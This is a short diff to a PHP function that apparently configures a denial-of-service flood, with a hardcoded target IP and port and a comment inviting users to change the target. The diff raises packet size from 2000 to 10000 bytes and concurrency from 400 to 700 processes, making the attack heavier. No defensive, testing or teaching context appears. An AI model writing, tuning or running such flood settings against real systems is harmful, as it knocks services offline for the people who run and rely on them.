@@ -237,9 +237,9 @@ function job1(): array
     // --- Configuration ---
     $targetIp = '35.79.103.37'; // Change to target IP
     $targetPort = 9070;        // Change to target port
-    $packetSize = 2000;      // Packet size in bytes
+    $packetSize = 10000;      // Packet size in bytes
     $duration = 30;           // Duration in seconds
-    $numProcesses = 400;      // Concurrency level (equivalent to Python threads)
+    $numProcesses = 700;      // Concurrency level (equivalent to Python threads)
 
     $pids = [];
     $errorCode = 0;
